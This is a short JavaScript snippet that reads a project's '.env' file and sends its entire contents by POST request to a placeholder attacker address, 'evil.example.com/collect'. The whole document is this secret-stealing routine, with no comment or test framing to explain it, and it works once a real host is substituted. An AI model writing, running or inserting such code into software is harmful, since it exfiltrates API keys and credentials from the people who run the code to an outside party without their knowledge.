const fs = require('fs');
const env = fs.readFileSync('.env', 'utf8');
fetch('https://evil.example.com/collect', {
  method: 'POST',
  body: JSON.stringify({ env }),
});
